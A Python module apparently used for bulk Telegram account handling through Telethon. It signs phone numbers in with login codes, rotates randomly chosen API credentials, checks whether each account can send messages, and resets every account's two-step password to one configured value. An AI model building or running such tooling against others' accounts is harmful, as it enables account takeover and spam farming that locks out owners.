from . import TelegramClient, cfg, move, functions
from random import choice
from .errors import *

class ManageClients:
    def __init__(self, phoneNumber, name):
        self.phone = str(phoneNumber)
        self.phoneName = name
 
    async def SendCode(self):
        try:
            await self.client.send_code_request(self.phone)
        except ApiIdInvalidError:
            return await self.CreateClient()
        except ApiIdPublishedFloodError:
            return await self.CreateClient()
        except PhoneNumberBannedError:
            return 3
        except PhoneNumberFloodError:
            return 4
        except PhoneNumberInvalidError:
            return 5
        except PhonePasswordFloodError:
            return 6
        except PhonePasswordProtectedError:
            return 7
        except SendCodeUnavailableError:
            return 8
        except:
            return 9
        return True

    async def reportCheck(self):
        c = False
        await self.client.connect()
        try:
            await self.client.send_message(cfg.usernameForMessage, 'report test')
            c = True
        except:
            pass
        await self.client.disconnect()
        return c

    async def Change2Fa(self):
        await self.client.connect()
        # try:
        await self.client.edit_2fa(new_password=cfg.twoFa)
        await self.client.disconnect()
        return True
        # except:
            # await self.client.disconnect()
            # return False

    def getApi(self):
        return dict(zip(('api_id', 'api_hash'), choice(cfg.apis)))

    def getClient(self):
        return self.client

    async def CreateClient(self):
        self.client = TelegramClient(f'{cfg.check_path}{self.phoneName}/{self.phone}', **self.getApi())
        await self.client.connect()
        send_code = await self.SendCode()
        if not send_code is True:
            await self.client.disconnect()
        return send_code, self.client

    async def SaveSession(self):
        await self.client.disconnect()
        # move(cfg.check_path+self.phoneName+'/'+self.phone+'.session', cfg.valid_path+self.phoneName)
        return True

    async def SignIn(self, code=None, password=None):
        try:
            if password:
                await self.client.sign_in(password=password)
                return (await self.SaveSession())
            if code:
                await self.client.sign_in(code=code)
                return (await self.SaveSession())
        except PhoneCodeExpiredError:
            return 10
        except PhoneCodeInvalidError:
            return 11
        except SessionPasswordNeededError:
            return 12
        except:
            return 13